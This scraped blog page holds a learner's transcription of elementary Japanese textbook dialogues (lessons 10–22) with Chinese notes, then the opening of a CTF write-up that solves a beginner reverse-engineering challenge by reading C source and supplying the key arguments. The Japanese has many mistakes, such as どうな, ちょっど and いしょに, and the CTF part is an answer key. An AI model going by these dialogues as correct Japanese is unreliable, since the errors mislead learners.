<p>李：小野さん、この　<strong>浴衣（ゆかた）</strong>　はちょ　<strong>っ</strong>　と　<strong>小さい（ちいさい）</strong>　です</p>
<p>小野：あら、それは子供用です。これ、どう　<strong>ぞ</strong></p>
<p>李：これはちょっ　<strong>ど</strong>　いいです　　<strong>## ちょっと和ちょっど，前者为“稍微，一点”，后者为“正好，恰好”</strong></p>
<p>小野：李さん、熱いですか</p>
<p>李：いいえ、ちょっといいです、とても　<strong>気持ち（きもち）</strong>　がいいですね</p>
<p>李：小野さん、すばらしい　<strong>眺め（眺め）</strong>　ですね</p>
<p>小野：ええ、　<strong>本当（ほんとう）</strong>　に</p>
<p>李：小野さん、それは何ですか</p>
<p>小野：ああ、これは温泉のお粥です。李さんも　<strong>飲み（のみ）</strong>　ますか</p>
<p>李：はい。あまりおいしくなかったです</p>
<h1 id="第10课"><a href="#第10课" class="headerlink" title="第10课"></a>第10课</h1><p>　<strong>京都（きょうと）</strong>　の　<strong>紅葉（もみじ）</strong>　はとても有名です</p>
<p>この通りは　<strong>静か（しずか）</strong>　ではありません</p>
<p><strong>奈良（なら）</strong>　は静か町です</p>
<p>昨日は日曜日でした</p>
<p>甲：ど　<strong>ん</strong>　なお土産買いましたか</p>
<p>乙：綺麗な　<strong>人形（にんぎょう）</strong>　を買いました</p>
<p>甲：京都はどうでしたか</p>
<p>乙：とても綺麗でした、でも、静かではありませんでした</p>
<p>甲：横浜はどうな町ですか</p>
<p>乙：大きい町です、そして、にぎやかな町です</p>
<p>甲：東京の天気はどうでしたか</p>
<p>乙：昨日は晴れでした、でもおとといは雨でした</p>
<p>长岛：昨日京都へ行きました</p>
<p>小野：京都ですか？京都の紅葉はどうでしたか</p>
<p>長島：とても綺麗でした、でも、町はあまり静か　<strong>じゃ</strong>　ありませんでした</p>
<p>李：えっ？</p>
<p>長島：今ちょっど　<strong>修学旅行（しゅうがくりょこう）</strong>　の　<strong>シーズ</strong>　です、とてもにぎやかでした</p>
<p>李：この通りは静かですね</p>
<p>長島：ああ、今日は　<strong>平日（へいじつ）</strong>　ですね。でも、休みの日は　<strong>観光客（かんこうきゃく）</strong>　がとても多い、とてもにぎやかですよ</p>
<p>李：そうですか</p>
<p>李：あれえ、誰もいませんね</p>
<p>小野：そうですね</p>
<p>李：あの、すみません、この　<strong>美術館（びじゅつかん）</strong>　<strong>には</strong>　どうな　<strong>作品（さくひん）</strong>　が　<strong>あり</strong>　ますか</p>
<p>小野：世界中の有名な作家の　<strong>彫刻（ちょうこく）</strong>　です</p>
<p>長島：美術館の庭にもいろいろおもしろい　<strong>の</strong>　がありますよ</p>
<h1 id="第11课"><a href="#第11课" class="headerlink" title="第11课"></a>第11课</h1><p>小野さんは歌が好　<strong>き</strong>　です</p>
<p>スミスさんは　<strong>韓国（かんこく）</strong> 語が分かります</p>
<p>吉田さんは　<strong>時々（ときどき）</strong>　<strong>中国（ちゅうごく）</strong>　や韓国へ行きます</p>
<p>森さんはお酒が好きですから、毎日飲みます</p>
<p>甲：吉田さんは料理ができますか</p>
<p>乙：いいえ、全然できません</p>
<p>甲：どうな音楽が好きですか</p>
<p>乙：　<strong>ロック</strong>　や　<strong>ポップス</strong>　などが好きです</p>
<p>甲：長島さん、　<strong>スペイン</strong>　語が分かりますか</p>
<p>乙：ええ、大学で　<strong>習い（習い）</strong>　ましたから、　<strong>少し（すこし）</strong>　分かります</p>
<p>甲：小野さん、よく音楽が聞きますか</p>
<p>乙：ええ、家でＣＤをよく聞きます。そして、たまにコンサートへ行きます</p>
<p>李：箱根のホテルや、旅館が多いですね</p>
<p>小野：そうですね、会社の　<strong>別荘（べっそう）</strong>　もたくさん　<strong>あります</strong></p>
<p>李：長島さんや、小野さんもよく来ますか</p>
<p>長島：はい、時々車で来ます</p>
<p>小野：私は　<strong>運転（うんてん）</strong>　ができません、いつも電車です</p>
<p>長島：僕は来月また来ますよ</p>
<p>李：どうしてですか</p>
<p>長島：この近くのホテルで友達の写真展がありますから</p>
<p>李：箱根のお土産は　<strong>何が</strong>　いいですか</p>
<p>小野：そうですね…迷いですね</p>
<p>長島：　<strong>寄木細工（よせぎざいく）</strong>　はどうですか？とても　<strong>有名（ゆうめい）</strong>　ですよ</p>
<p>李：きれいな　<strong>模様（もよう）</strong>　です</p>
<p>小野：そうですね</p>
<p>長島：好きですか</p>
<p>李：はい、とても</p>
<h1 id="第12课"><a href="#第12课" class="headerlink" title="第12课"></a>第12课</h1><p>李さんは森さんより若いです</p>
<p>日本より、中国のほうが広いです</p>
<p>　<strong>神戸（こうべ）</strong>　は大阪　<strong>ほど</strong>　にぎやかではありません</p>
<p>スポーツの中で　<strong>サッカー</strong>　はいちばんおもしろいです</p>
<p>甲：北京は　<strong>東京（とうきょう）</strong>　より寒いですか</p>
<p>乙：はい、冬の北京は東京よりずっと寒いです</p>
<p>甲：日本語と英語とどちらが難しいですか</p>
<p>乙：日本語　<strong>のほうが</strong>　難しいです</p>
<p>甲：森さんはテニスが　<strong>上手（じょうず）</strong>　ですね</p>
<p>乙：いいえ、長島さんのほど上手ではありません</p>
<p>甲：季節の中でいつがいちばんすきですか</p>
<p>乙：春がいちばん好きです</p>
<p>李：長島さん、よくお酒を飲みますか</p>
<p>長島：ええ、お酒　<strong>は</strong>　<strong>大好き（だいすき）</strong>　ですから、毎晩飲みます</p>
<p>李：<strong>ビール</strong>　と日本酒と、どちらかすきですか？</p>
<p>長島：どちらも好きです、でも、<strong>焼酎（しょうちゅう）</strong>　<strong>が</strong>　いちばん好きです</p>
<p>小野：焼酎は最近人気がありますね</p>
<p>李：小野さんも焼酎が好きですか？</p>
<p>小野：いいえ、焼酎より、　<strong>ワイン</strong>　の　<strong>ほうが</strong>　いいです。でも、ビールもよく飲みます</p>
<p>長島：中国　<strong>は</strong>　お茶が多いですね</p>
<p>李：え。　<strong>ウーロン</strong>　茶か、ジャスミン茶か、　<strong>緑茶（りょくちゃ）</strong>　<strong>など</strong>　、いろいろありますよ</p>
<p>小野：どのお茶がいちばん人気がありますか</p>
<p>李：<strong>やっぱり</strong>　ウーロン茶です</p>
<p>小野：李さんもよくお茶を飲みますか</p>
<p>李：ええ、毎日ウーロン茶かジャスミン茶　<strong>を</strong>　飲みます</p>
<p>長島：<strong>どちら</strong>　がおいし　<strong>い</strong>　ですか</p>
<p>李：どちらもおいしいですよ。わたしはジャスミン茶　<strong>のほうがすきですが</strong></p>
<h1 id="第13课"><a href="#第13课" class="headerlink" title="第13课"></a>第13课</h1><p>机の上に上に本が３　<strong>冊（さつ）</strong>　あります</p>
<p>李さんは毎日７時間働きます</p>
<p>李さんは1週間に２回プールへ行きます</p>
<p>午後ゆうべゆうべ荷物を出しに行きます</p>
<p>甲：すみません、　<strong>はがき</strong>　を５枚ください</p>
<p>乙：はい、５枚で２５０円です</p>
<p>甲：よく映画を見ますか</p>
<p>乙：ええ、1か月に二回　<strong>ぐらい</strong>　みます</p>
<p>甲：家から会社まで　<strong>どのぐらい</strong>　かかりますか</p>
<p>乙：電車で１時間ぐらいかかります</p>
<p>甲：昨日何をしましたか</p>
<p>乙：<strong>新宿（しんじゅく）</strong>　へ　<strong>映画（えいが）</strong>　を見に行きました</p>
<p>小野：これから森さんと近くのお店へ飲みに行きます。李さんもいしょにど　<strong>う</strong>　でしたか</p>
<p>李：えっ、いいですか、お願　<strong>い</strong>　します</p>
<p>李：森さんたちはよくこのお店へ行きますか</p>
<p>森：ええ、ぼくは週に２回来ます</p>
<p>小野：わたしもよく来ます</p>
<p>森：あの　<strong>う</strong>　、すみません、とりあえず生ビールを３　<strong>つ</strong>　ください</p>
<p>李：生ビールは１　<strong>杯（はい）</strong>　３００円ですか</p>
<p>森：ここはお酒も食べ物も安いです、焼き鳥は５本４００円ですからね</p>
<p>小野：唐揚げや肉じゃがは１　<strong>皿（さら）</strong>　３５０円です</p>
<p>李：ほかのお店はいくらぐらいですか</p>
<p>森：焼き鳥は１本１５０円ぐらいです</p>
<p>李：<strong>じゃあ</strong>、ここは安いですね</p>
<h1 id="第14课"><a href="#第14课" class="headerlink" title="第14课"></a>第14课</h1><p>昨日デパートへ行って、　<strong>買い物しました</strong></p>
<p>李さんは毎晩ラジオを聞いてから寝ます</p>
<p>ここに住所と名前を書いてください</p>
<p>李さんは毎朝７時に家を出ます</p>
<p>甲：今日の午後は何をしますか</p>
<p>乙：図書館へ行ってから、　<strong>勉強（べんきょう）</strong>　<strong>を</strong>　します。そして家へ　<strong>帰って（かえって）</strong>　、手紙を書きます</p>
<p>甲：いつ出かけますか</p>
<p>乙：昼ご飯　<strong>を</strong>　たべてから、でかけます</p>
<p>甲：すみません、この荷物を中国へ　<strong>送って（おくって）</strong>　ください</p>
<p>乙：船便ですか、　<strong>航空便（こうくうびん）</strong>　ですか</p>
<p>甲：船便でお願いします</p>
<p>甲：このバスはえきまえを通りますか</p>
<p>乙：はい、　<strong>通（とお）</strong>　ります</p>
<p>李：吉田　<strong>課長（かちょう）</strong>　、原稿ができました</p>
<p>吉田：箱根の記事ですね、　<strong>ちょっと</strong>　見せてください</p>
<p>吉田：なかなかいいですね、いつできましたか</p>
<p>李：　<strong>昨日（きのう）</strong>　会社　<strong>で</strong>　整理して、小野さんに　<strong>見せました</strong>。　そしてデパートへ帰って、書きました</p>
<p>吉田：そうですか、大変ですね。写真もできましたか</p>
<p>り：はい、これから長島の　<strong>事務所（じむしょ）</strong>　へ行って、写真を選びます</p>
<p>吉田：そうですか</p>
<p>り：後で写真も見せてませんか</p>
<p>吉田：李さん、もう会社を出ますか</p>
<p>李：はい、銀行　<strong>で</strong>　お金を　<strong>下ろして（おろして）</strong>から、<strong>行きます</strong></p>
<p>吉田：じゃあ、近くの郵便局を通りますね。すみません　<strong>が</strong>、この手紙を　<strong>出して</strong>　ください</p>
<p>り：はい。　<strong>速達（そくたつ）</strong>　で出しますか</p>
<p>吉田：はい、　<strong>そうしてください</strong></p>
<h1 id="第15课"><a href="#第15课" class="headerlink" title="第15课"></a>第15课</h1><p>小野さんはいま　<strong>新聞（しんぶん）</strong>　を読んでいます</p>
<p>ここで写真をとってもいいですか</p>
<p>飛行機の中でタバコを吸ってはいけません</p>
<p>日曜日、小野さんは公園　<strong>で</strong>　ボート　<strong>に</strong>　乗ります</p>
<p>甲：もしもし、森さん、今どこですか</p>
<p>乙：今市役所の前を　<strong>歩（歩）</strong>　いています</p>
<p>甲：すみません、この　<strong>辞書（じしょ）</strong>　を　<strong>借り（かり）</strong>　でもいいですか</p>
<p>乙：ええ、　<strong>ちょっと</strong>。。。今　<strong>使（つか）</strong>　っています</p>
<p>甲：すみません、ここ　<strong>に</strong>　座ってもいいですか</p>
<p>乙：はい、どうぞ</p>
<p>甲：あっ、ここで携帯電話を使ってはいけません</p>
<p>乙：すみません、これから気を付けます</p>
<p>小野：もしもし、小野です、どうしました？</p>
<p>李：ちょっと　<strong>熱（ねつ）</strong>　があります。今日休んでもいいですか</p>
<p>小野：ええ、　<strong>もちろん</strong>　です。あまり無理をしではいけませんよ</p>
<p>李：はい、分かりました。　<strong>あのう</strong>、吉田課長は？</p>
<p>小野：今　<strong>会議室（かいぎしつ）</strong>　で打合せをしています、後で伝えます</p>
<p>李：お願いします</p>
<p>小野：もう　<strong>病院（びょういん）</strong>　に行くの</p>
<p>李：いいえ、まだです</p>
<p>小野：　<strong>じゃあ</strong>　、病院に行ってから、ゆっくり休んでください</p>
<p>李：はい、ありがとうございます</p>
<p>医者：風邪ですね。温かい物をたべて、十分　<strong>睡眠（すいみん）</strong>　をとってください。それから、今晩お風呂に入ってはいけません</p>
<p>李：分かりました。</p>
<p>医者：では、薬をだします。薬局に行って、もらってください</p>
<p>李：ありがとうございます</p>
<p>医者：お大事に</p>
<h1 id="第16课"><a href="#第16课" class="headerlink" title="第16课"></a>第16课</h1><p>ホテルの部屋広くて明るいです</p>
<p>このコンピュータの　<strong>操作（そうさ）</strong>　は簡単で便利です</p>
<p>森さんは車を持っています</p>
<p>３か月コンピュータを　<strong>練習（れんしゅう）</strong>　しましたが、まだあまりできません</p>
<p>甲：森さんはどうな人ですか</p>
<p>乙：背が高いて、脚が　<strong>長（なが）</strong>　くて、ハンサムな人です</p>
<p>甲：日本はどうですか</p>
<p>乙：町がきれいて　<strong>安全（あんぜん）</strong>　ですが、物は高いです</p>
<p>甲：スミスさんは　<strong>会社員（かいしゃいん）</strong>　ですか</p>
<p>乙：はい、旅行会社の社員て、　<strong>営業部（えいぎょうぶ）</strong>　の　<strong>部長（ぶちょう）</strong>　です</p>
<p>甲：長島さんはどこにすんで　<strong>いま</strong>　すか？</p>
<p>乙：家族といしょに　<strong>渋谷（しぶや）</strong>　で住んでいます</p>
<p>李：この建物は大きくてきれいですね</p>
<p>森：はい、日本の有名なけじく　<strong>建築家（けんちくか）</strong>　の設計　<strong>で</strong>　最新の　<strong>展示場（てんじじょう）</strong>　です</p>
<p>李：デザインがユニークで、　<strong>形（かたち）</strong>　がおもしろいです</p>
<p>李：警備の人は　<strong>いろいろな所</strong>　<strong>にいますね</strong></p>
<p>森：ここは駅前から近くで、<strong>入場料（にゅうじょうりょう）</strong>　が安いです。<strong>たくさんの</strong>　人は来ますから、警備は　<strong>厳重（げんじゅう）</strong>　です。あっ、李さん、IDカードはいますか</p>
<p>李：安心してください、　<strong>ちゃんと</strong>　持っています。ほら</p>
<p>李：　<strong>入り口（いりぐち）</strong>　は狭いですから、中はなかなか広いですね</p>
<p>森：はい、天井　<strong>が</strong>　高くて、　<strong>窓（まど）</strong>　が多くって、とても明るいです</p>
<p>李：　<strong>クリスマスツリー</strong>　の横に赤くて大きな看板がありますか？<strong>あ</strong>　れは何ですか</p>
<p>森：ああ、あれは航空会社の　<strong>広告（こうこく）</strong>　ですよ、<strong>ずいぶん</strong>　<strong>派手（はで）</strong>　ですね</p>
<p>李：派手ですが、わたしは嫌いじゃありませんよ</p>
<h1 id="第17课"><a href="#第17课" class="headerlink" title="第17课"></a>第17课</h1><p>わたしは新しい　<strong>洋服（ようふく）</strong>　が欲しいです</p>
<p>わたしは　<strong>映画（えいが）</strong>　をみたいです</p>
<p>いしょにお茶をのみませんか</p>
<p>ちょっと休みましょ　<strong>う</strong></p>
<p>甲：なにが一番欲しいですか</p>
<p>乙：安い車を欲しいです</p>
<p>甲：今日デパートへ買い物に行きます、李さんもいしょにどうですか</p>
<p>乙：はい、ぜひ行きたいます</p>
<p>甲：　<strong>土曜日（どようび）</strong>　の午後コンサートへ行きませんか</p>
<p>乙：いいですね、いきましょう</p>
<p>李：小野さんは何をお願いしますか</p>
<p>小野：　<strong>健康（けんこう）</strong>　と　<strong>恋愛（れんあい）</strong>　です</p>
<p>李：恋愛ですか</p>
<p>小野：ええ、今年中に結婚したいです</p>
<p>李：相手はいますか</p>
<p>小野：いいえ、まず恋人が欲しいです</p>
<p>李：どうな　<strong>男性（だんせい）</strong>　がいいですか</p>
<p>小野：まじめで優しい人がいいですね</p>
<p>李：じゃ　<strong>あ</strong>、森さんはどうですか</p>
<p>小野：ええ？</p>
<p>小野：ちょっと寒いですね、温かいものを食べませんか</p>
<p>李：いいですね</p>
<p>小野：なにがいいですか</p>
<p>李：何でもいいです</p>
<p>小野：じゃあ、お汁粉はどうですか？いいお店を知っています、　<strong>そこに</strong>　いきましょう</p>
<p>李：お汁粉？ぜひ食べたいです</p>
<h1 id="第18课"><a href="#第18课" class="headerlink" title="第18课"></a>第18课</h1><p>携帯電話小さくなにました</p>
<p>テレビの音を大きくします</p>
<p>息子は医者になりました</p>
<p>部屋をきれいに　<strong>して</strong>　ください</p>
<p>甲：風邪はどうですか</p>
<p>乙：　<strong>ゆうべ</strong>　薬を飲みましたが、まだよくなりません</p>
<p>甲：　<strong>旅行（りょこう）</strong>　の荷物は　<strong>軽（かる）い</strong>　<strong>ほう</strong>　がいいですよ</p>
<p>乙：はい、できるだけ軽くします</p>
<p>甲：お嬢さんはおいくつですか</p>
<p>乙：今年七歳になりました</p>
<p>甲：あのう、ちょっとうるさいですよ</p>
<p>乙：あっ、すみません、静かにします</p>
<p>李：小野さん、今日たくさん買いますか</p>
<p>小野：はい、お正月は洋服が安くなります　<strong>から</strong>、まとめて買います</p>
<p>李：どのぐらい安くなりますか？</p>
<p>小野：だいたい定価の３　<strong>割引（わりびき）</strong>　か　<strong>半額（はんがく）</strong>　になります</p>
<p>李：半額ですか？私たしは新しい洋服がほしくなりました</p>
<p>李：赤と、青と、どちらがいいですか</p>
<p>小野：赤いほうがいいですね。よく似合い　<strong>ますよ</strong></p>
<p>李：そうですか？じゃあ、これ <strong>にします</strong></p>
<p><strong>店員（てんいん）</strong>　：間もなく　<strong>タイムサービス</strong>　の時間です、さらにお安くします</p>
<p>小野：<strong>むうすぐ</strong> ６時になりますから、タイムサービスの時間が　<strong>始（はじ）</strong>　まります</p>
<p>李：タイムサービス？</p>
<p>小野：ええ、今から７時までもっとお安くなります。さあ、いきましょ　<strong>う</strong></p>
<h1 id="第19课"><a href="#第19课" class="headerlink" title="第19课"></a>第19课</h1><p>部屋のかぎを忘れないでください</p>
<p>李さんは今日早く家に　<strong>帰ら（かえら）</strong>　なければなりません</p>
<p>明日残業しなくてもいいですよ</p>
<p>あの人は吉田課長です</p>
<p>甲：その　<strong>品物（しなもの）</strong>　に触らないでください</p>
<p>乙：あっ、すみません</p>
<p>甲：李さん、明日い　<strong>っ</strong>　しょに食事にいきませんか</p>
<p>乙：すみません、今日は早く家にかいて帰って、レポートを書かなければなりません</p>
<p>甲：先生、もう薬を飲まなくでもいいですか</p>
<p>乙：はい、いいですよ</p>
<p>甲：吉田課長はいますか？</p>
<p>乙： わたしが吉田です</p>
<p>李：小野さん、初め　<strong>て</strong>　ですから、ちょっと怖いです</p>
<p>小野：　<strong>心配（しんぱい）</strong>　しなくてもいいですよ、ここは　<strong>初心者（しょしんしゃ）</strong>　コースです</p>
<p>李：森さん、小野さん、待ってください、先に行かないでください</p>
<p>小野：急がなくでもいいですよ、私たちもゆっくり滑りますから</p>
<p>森：李さん、スキーはどうですか？</p>
<p>李：何度も転びますが、とてもおもしろいです</p>
<p>森：そうですか、だいぶ上手になりましたよ</p>
<p>李：本当ですか？でも、もっと上手になりたいです</p>
<p>小野：じゃあ、もっと　<strong>練習（れんしゅう）</strong>　しなければなりませんね。もう一度練習しますか？</p>
<p>李：はい。今度は先に滑　<strong>っても</strong>　いいですか？</p>
<p>小野：いいですよ、でも　<strong>上級者（じょうきゅうしゃ）</strong>　のコースは　<strong>入（はい）</strong>　らないでください</p>
<p>李：大丈夫です、心配しないてください</p>
<h1 id="第20课"><a href="#第20课" class="headerlink" title="第20课"></a>第20课</h1><p>スミスさんはピアノを弾くことができます</p>
<p>わたしの趣味は切手を集めることです</p>
<p><strong>こちらへ</strong>　<strong>来（く）</strong>　る前に電話をかけてください</p>
<p>冬休みどくかへ行きます</p>
<p>甲：李さんは車を　<strong>運転（うんてん）</strong>　することができますか</p>
<p>乙：はい、できます</p>
<p>甲：ここで写真を撮　<strong>っても</strong>　いいですか</p>
<p>乙：いいえ、ここでは撮ることができません</p>
<p>甲：何か趣味がありますか</p>
<p>乙：ええ、音楽を聞　<strong>く</strong>　ことです</p>
<p>甲：森さん、いつがギターを練習しますか</p>
<p>乙：毎晩、寝る前に練習します</p>
<p>小野：李さん、春節は中国へ　<strong>帰り（かえり）</strong>　ますか</p>
<p>李：いいえ、いま仕事は忙しいかったですから、帰りません</p>
<p>森：じゃあ、どこかへ行きませんか</p>
<p>小野：横浜の中華街はどうですか？中国の獅子舞はいますから</p>
<p>小野：料理はどうですか</p>
<p>李：とともおいしかったですよ、特に餃子は</p>
<p>森：李さんはぎょうざを　<strong>作る（つくる）</strong>　ことができますか</p>
<p>李：ええ、北京では春節前に　<strong>家族（かぞく）</strong>　みなんで餃子を作ります</p>
<p>小野：手作りの<strong>餃子は皮が</strong>　おいしですよ</p>
<p>李：小野さんも餃子を作ることができますか</p>
<p>小野：もちろん、私の趣味はおいし物を作ることですから</p>
<p>森：本当ですか？じゃあ、いつか　<strong>ごちそう</strong>　してください</p>
<p>小野：いいですよ、李さんが　<strong>帰国（きこく）</strong>　前に、ぜひい　<strong>っ</strong>　しょにうちに来てください</p>
<h1 id="第21课"><a href="#第21课" class="headerlink" title="第21课"></a>第21课</h1><p>わたしはすき焼きをたべたことがあります</p>
<p>李さんは会社が終わった後で飲みに行きます</p>
<p>もっと野菜をたべたほうがいいですね</p>
<p>窓を閉めましょうか</p>
<p>甲：お寿司をたべたことがありますか</p>
<p>乙：いいえ、一度もありません。天ぷらは食べたことがあります</p>
<p>甲：この資料をみってもいいですか</p>
<p>乙：はい、読んだ後で森さんに　<strong>渡し（わたし）</strong>　てください</p>
<p>甲：ホテルは予約したほうがいいですね</p>
<p>乙：ええ、連休ですから、　<strong>その</strong>　ほうがいいですね</p>
<p>甲：何か食べますか</p>
<p>乙：いいえ、寝る前に食べないほうがいいですよ</p>
<p>小野：　<strong>少し（すこし）</strong>　いそぎましょか。　<strong>遅れ（おくれ）</strong>　ないほうがいいですから</p>
<p>李：そうしましょう、ところ　<strong>で</strong>、小野さんはよく歌舞伎を見ますか</p>
<p>小野：仕事終わった後で、何度か見に行ったことがあります。終わりは９時過ぎですね、なにか食べますか</p>
<p>李：歌舞伎を見た後で、たべますか？それとも、<strong>みるまえに何かたべますか</strong></p>
<p>小野：ええ。。。休憩時間に　<strong>食事（しょくじ）</strong>　をしましょうか</p>
<p>李：ええ、いいですよ</p>
<p>小野：じゃあ、早く行ってお弁当を買ったほうがいいですね</p>
<p>李：言葉はわかりませんでしたが、とてもよかったです</p>
<p>小野：ええ、課長に感謝しましょうよ</p>
<p>李：ええ。　<strong>京劇（きょうげき）</strong>　はいいですか、歌舞伎もすばらしですね。小野さんは京劇を見たことがありますか</p>
<p>小野：いいえ、一度もありません、いつかみたいです</p>
<p>李：じゃあ、ぜひ北京へ京劇を見に来てください</p>
<h1 id="第22课"><a href="#第22课" class="headerlink" title="第22课"></a>第22课</h1><p>森さんは毎晩テレビを見る</p>
<p>昨日はとても忙しかった</p>
<p>コンピュータは簡単ではない</p>
<p>今日は曇りだ</p>
<p>甲：明日はボーリングに行かない？</p>
<p>乙：ごめん、明日は仕事が　<strong>ある</strong>　から</p>
<p>甲：昨日の試験はどう　<strong>だった</strong>？</p>
<p>乙：ちょっと難しいだけど、　<strong>まあまあ</strong>　できたよ</p>
<p>甲：このネクタイ、　<strong>派手（はで）</strong></p>
<p>乙：　<strong>ううん</strong>　、全然派手じゃないわ</p>
<p>甲：森さんの電話番号、知ってる？</p>
<p>乙：<strong>うん</strong>　、知ってる。</p>
<p>小野：もしもし、小野です</p>
<p>清水：小野さん？清水だけ　<strong>ど</strong></p>
<p>小野：ああ、清水君、どうしたの？</p>
<p>清水：最近、太田から連絡　<strong>あった</strong>？</p>
<p>小野：ううん？ないわよ、どうして？</p>
<p>清水：太田、今度中国へ　<strong>転勤（てんきん）</strong>　だって？</p>
<p>小野：本当に？いつ行くの？</p>
<p>清水：　<strong>た</strong>　しか　<strong>来月（らいげつ）</strong>　だよ</p>
<p>小野：急ね、中国のどこ？期間はどうの　<strong>ぐ</strong>　らい？</p>
<p>清水：北京だって、期間４年か５年かな</p>
<p>小野：<strong>ずいぶん</strong>　長いわね。太田君１人　<strong>で</strong>　行くの？</p>
<p>清水：いや、　<strong>奥さん（おくさん）</strong>　もいしょだよ。来週は送別会　<strong>をするげど</strong>、　<strong>都合（つごう）</strong>　はどうかな</p>
<p>小野：ええと、火曜日は予約あるけど、それ以外は大丈夫よ</p>
<p>清水：分<strong>かった</strong>、じゃあ、また連絡するよ</p>
<p>李：お友達　<strong>からですか</strong>？</p>
<p>小野：あ<strong>っ</strong>　、分かりました？</p>
<p>李：ええ、いつもの話し方じゃありませんでしたから</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/02/15/%E8%80%83%E8%AF%81-%E6%97%A5%E8%AF%AD-%E5%88%9D%E7%BA%A7%E8%AF%BE%E6%96%87%E6%B1%89%E8%AF%91%E6%97%A5/" data-id="ckla3x5dr0002z0usc4lvgvax" data-title="考证-日语-初级课文汉译日" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%80%83%E8%AF%81/" rel="tag">考证</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CTF-wp-攻防世界reverse初级" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/02/12/CTF-wp-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Creverse%E5%88%9D%E7%BA%A7/" class="article-date">
  <time class="dt-published" datetime="2021-02-12T02:33:31.000Z" itemprop="datePublished">2021-02-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/02/12/CTF-wp-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Creverse%E5%88%9D%E7%BA%A7/">CTF-wp-攻防世界reverse初级</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="open-source"><a href="#open-source" class="headerlink" title="open-source"></a>open-source</h1><p>考察：gcc的使用，c源码阅读</p>
<p>首先，gcc编译</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc 1.c -o 1.exe</span><br></pre></td></tr></table></figure>
<p>其次，阅读源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123; <span class="comment">// argc为参数格式，argv为命令行传入的参数</span></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;what?\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> first = atoi(argv[<span class="number">1</span>]); <span class="comment">// 将字符串转化为数字（有数字转数字，遇到字母就停止运算</span></span><br><span class="line">    <span class="keyword">if</span> (first != <span class="number">0xcafe</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;you are wrong, sorry.\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> second = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> (second % <span class="number">5</span> == <span class="number">3</span> || second % <span class="number">17</span> != <span class="number">8</span>) &#123; <span class="comment">// 25</span></span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;ha, you won&#x27;t get it!\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">&quot;h4cky0u&quot;</span>, argv[<span class="number">3</span>])) &#123; <span class="comment">// h4cky0u</span></span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;so close, dude!\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Brr wrrr grr\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> hash = first * <span class="number">31337</span> + (second % <span class="number">17</span>) * <span class="number">11</span> + <span class="built_in">strlen</span>(argv[<span class="number">3</span>]) - <span class="number">1615810207</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Get your key: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, hash);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>运行exe</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\1.exe  51966 25 h4cky0u</span><br></pre></td></tr></table></figure>
